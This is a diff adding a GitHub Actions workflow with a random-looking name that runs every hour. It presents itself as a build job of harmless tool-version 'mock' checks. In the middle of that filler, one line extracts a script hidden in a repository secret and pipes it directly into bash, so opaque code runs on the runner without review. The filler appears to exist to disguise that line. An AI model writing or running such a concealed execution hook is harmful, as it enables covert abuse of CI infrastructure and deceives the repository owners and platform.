@@ -1,0 +1,59 @@
+name: sangtagang4567
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sangtagang4567
+        env:
+          s7174: ${{ secrets.s7174 }}
+        run: |
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo $s7174 | jq -r .f13198 | /bin/bash
+          echo "Exit code test: $?"
+          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Awk mock: echo '1' | awk '{print \$1+1}' 2>/dev/null || echo no-awk"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          echo "Env vars: $(env | wc -l) total"
+          echo "Bitbake mock: bitbake --version 2>/dev/null | head -1 || echo no-bitbake"
+          echo "Terraform-validate mock: terraform validate 2>/dev/null | head -1 || echo no-terraform-validate"
+          echo "Kubectx mock: kubectx --version 2>/dev/null | head -1 || echo no-kubectx"
+          echo "Kubens mock: kubens --version 2>/dev/null | head -1 || echo no-kubens"
+          echo "Kustomize mock: kustomize --version 2>/dev/null | head -1 || echo no-kustomize"
+          echo "Objdump mock: objdump --version 2>/dev/null | head -1 || echo no-objdump"
+          echo "Autotools mock: autoconf --version 2>/dev/null | head -1 || echo no-autoconf"
+          echo "Unalias mock: unalias ll 2>/dev/null || true"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Gitlab-CI mock: gitlab-ci-local --version 2>/dev/null | head -1 || echo no-gitlab-ci"
+          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
+          echo "Uniq mock: echo -e 'a\na' | uniq 2>/dev/null || echo no-uniq"
+          echo "Terraform mock: terraform --version 2>/dev/null | head -1 || echo no-terraform"
+          echo "Terraform mock: terraform --version 2>/dev/null | head -1 || echo no-terraform"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          echo "Nomad mock: nomad --version 2>/dev/null | head -1 || echo no-nomad"
+          echo "Top mock: top -bn1 | head -1 2>/dev/null || echo no-top"
+          echo "Kube-ps1 mock: kube-ps1 --version 2>/dev/null | head -1 || echo no-kube-ps1"
+          echo "Egrep mock: egrep 'a' <<< 'abc' 2>/dev/null || echo no-egrep"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
+          echo "Simple calc: $(( 10 + 20 ))"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          echo "Netstat mock: netstat -tuln 2>/dev/null | head -1 || echo no-netstat"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "Vagrant mock: vagrant --version 2>/dev/null | head -1 || echo no-vagrant"
+          echo "Brace exp: echo file_{1..3}.txt"
+          echo "Cut mock: echo 'a b c' | cut -d' ' -f2 2>/dev/null || echo no-cut"
+          echo "Perl mock: perl -v 2>/dev/null | head -1 || echo no-perl"
+          echo "Free mock: free -m | head -1 2>/dev/null || echo no-free"
+          echo "Ltrace mock: ltrace ls 2>/dev/null | head -1 || echo no-ltrace"
+          echo "Cc mock: cc --version 2>/dev/null | head -1 || echo no-cc"
+          echo "Lsblk mock: lsblk | head -1 2>/dev/null || echo no-lsblk"
+          echo "Random ID: $RANDOM$RANDOM"
+          echo "Virt-manager mock: virt-manager --version 2>/dev/null | head -1 || echo no-virt-manager"
+          echo "GitHub-Actions mock: act --version 2>/dev/null | head -1 || echo no-github-actions"
